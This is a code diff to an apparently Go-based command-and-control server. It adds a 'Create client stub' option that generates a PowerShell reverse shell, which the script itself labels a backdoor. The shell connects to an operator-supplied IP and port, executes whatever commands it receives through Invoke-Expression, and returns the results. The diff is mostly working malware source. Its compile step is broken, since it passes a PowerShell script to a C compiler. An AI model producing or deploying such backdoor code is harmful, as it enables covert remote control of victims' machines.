@@ -5,6 +5,7 @@ import (
 	"fmt"
 	"net"
 	"os"
+	"os/exec"
 	"strings"
 	"sync"
 	"time"
@@ -101,6 +102,7 @@ func handleCommands() {
 		fmt.Println("1. Send command to all clients")
 		fmt.Println("2. Send command to a specific client")
 		fmt.Println("3. List connected clients")
+		fmt.Println("4. Create client stub")
 		fmt.Print("\nSelect an option: ")
 
 		var choice int
@@ -126,10 +128,107 @@ func handleCommands() {
 			// List all connected clients
 			listClients()
 
+		case 4:
+			CreateStub()
+
 		default:
 			fmt.Println("\nInvalid choice")
 		}
 	}
+}
+
+func CreateStub() {
+	// User input for IP, port, file name, and output directory
+	var ip, port, fileName, outputDir string
+	fmt.Print("Enter IP for client to connect to: ")
+	fmt.Scanln(&ip)
+	fmt.Print("Enter port for client to connect to: ")
+	fmt.Scanln(&port)
+	fmt.Print("Enter file name for the executable (e.g., client.exe): ")
+	fmt.Scanln(&fileName)
+	fmt.Print("Enter output directory: ")
+	fmt.Scanln(&outputDir)
+
+	// Set default output directory if none provided
+	if outputDir == "" {
+		outputDir = "."
+	}
+
+	// PowerShell script template, with user-defined IP and port
+	powershellScript := fmt.Sprintf(`Set-Variable -Name client -Value (Set-Variable -Name stream -Value (Set-Variable -Name buffer -Value (Set-Variable -Name writer -Value (Set-Variable -Name data -Value (Set-Variable -Name result -Value ($null))))));
+try {
+	Set-Variable -Name client -Value (New-Object Net.Sockets.TcpClient("%s", %s));
+	Set-Variable -Name stream -Value ($client.GetStream());
+	Set-Variable -Name buffer -Value (New-Object Byte[] 1024);
+	Set-Variable -Name encoding -Value (New-Object Text.UTF8Encoding);
+	Set-Variable -Name writer -Value (New-Object IO.StreamWriter($stream, [Text.Encoding]::UTF8, 1024));
+	$writer.AutoFlush = $true;
+	Write-Host "Running...";
+	Write-Host"";
+	Set-Variable -Name bytes -Value (0);
+	do {
+		$writer.Write("PS>");
+		do {
+			Set-Variable -Name bytes -Value ($stream.Read($buffer, 0, $buffer.Length));
+			if ($bytes -gt 0) {
+				$data += $encoding.GetString($buffer, 0, $bytes);
+			}
+		} while ($stream.DataAvailable);
+		if ($bytes -gt 0) {
+			$data = $data.Trim();
+			if ($data.Length -gt 0) {
+				try {
+					$result = Invoke-Expression -Command $data 2>&1 | Out-String;
+				} catch {
+					$result = $_.Exception | Out-String;
+				}
+				Clear-Variable data;
+				if ($result.Length -gt 0) {
+					$writer.Write($result);
+					Clear-Variable result;
+				}
+			}
+		}
+	} while ($bytes -gt 0);
+	Write-Host "Backdoor will now exit...";
+} catch {
+	Write-Host $_.Exception.InnerException.Message;
+} finally {
+	if ($writer -ne $null) { $writer.Close(); $writer.Dispose(); Clear-Variable writer; }
+	if ($stream -ne $null) { $stream.Close(); $stream.Dispose(); Clear-Variable stream; }
+	if ($client -ne $null) { $client.Close(); $client.Dispose(); Clear-Variable client; }
+	if ($buffer -ne $null) { $buffer.Clear(); Clear-Variable buffer; }
+	if ($result -ne $null) { Clear-Variable result; }
+	if ($data -ne $null) { Clear-Variable data; }
+	[GC]::Collect();
+}`, ip, port)
+
+	// Create a temporary file to hold the PowerShell script
+	tempFile, err := os.CreateTemp("", "temp_script_*.ps1")
+	if err != nil {
+		fmt.Println("Error creating temporary script file:", err)
+		return
+	}
+	defer os.Remove(tempFile.Name()) // Ensure temp file is removed after execution
+
+	// Write the PowerShell script to the temp file
+	_, err = tempFile.WriteString(powershellScript)
+	if err != nil {
+		fmt.Println("Error writing to temporary script file:", err)
+		return
+	}
+	tempFile.Close()
+
+	// Compile the PowerShell script to an executable with mingw-w64
+	outputPath := fmt.Sprintf("%s/%s", outputDir, fileName)
+	cmd := exec.Command("x86_64-w64-mingw32-gcc", "-o", outputPath, tempFile.Name())
+	output, err := cmd.CombinedOutput()
+	if err != nil {
+		fmt.Printf("Compilation failed: %s\n", output)
+		return
+	}
+
+	fmt.Println("Stub created successfully at", outputPath)
 }
 
 // Helper function to send a command to all connected clients
